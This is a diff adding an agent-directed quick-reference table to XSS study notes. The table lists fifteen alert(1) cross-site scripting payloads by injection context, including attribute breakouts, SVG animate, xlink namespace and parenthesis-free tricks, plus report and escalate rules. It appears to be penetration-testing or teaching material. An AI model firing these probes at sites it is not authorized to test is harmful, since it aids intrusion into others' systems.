@@ -1,5 +1,35 @@
 # XSS, SVG, Namespaces & JS Context — Deep Notes
 
+---
+
+## ⚡ Quick Reference (Agent: read this section first)
+
+### Injection contexts and payloads — try in this order
+
+| # | Context | Payload |
+|---|---------|--------|
+| 1 | HTML body (no filter) | `<img src=x onerror=alert(1)>` |
+| 2 | HTML body | `<svg onload=alert(1)>` |
+| 3 | HTML body | `<details open ontoggle=alert(1)>` |
+| 4 | Inside `<script>` block | `</script><img src=x onerror=alert(1)>` |
+| 5 | JS string — single quote | `';alert(1)//` |
+| 6 | JS string — double quote | `";alert(1)//` |
+| 7 | JS string — backslash escaped | `\';alert(1)//` |
+| 8 | Inside attribute (break out) | `" onmouseover="alert(1)` |
+| 9 | Inside attribute (single) | `' onmouseover='alert(1)` |
+| 10 | URL/href attribute | `javascript:alert(1)` |
+| 11 | SVG animation | `<svg><a><animate attributeName="href" values="javascript:alert(1)"/><text x=20 y=20>click</text></a></svg>` |
+| 12 | Namespace bypass | `<a xlink:href="javascript:alert(1)">click</a>` |
+| 13 | No parentheses allowed | `onerror=alert;throw 1` |
+| 14 | Attribute only (no new tags) | `accesskey="x" onclick="alert(1)"` (trigger: ALT+SHIFT+X) |
+| 15 | Custom/unknown tag | `<xss onclick=alert(1)>click</xss>` |
+
+### Decision: when to stop
+- Payload executes → **report hit**; record context + parameter + payload.
+- All 15 rows fail → escalate to `dom-xss.md`.
+
+---
+
 ## 1. SVG Basics
 
 * SVG = Scalable Vector Graphics (XML-based)
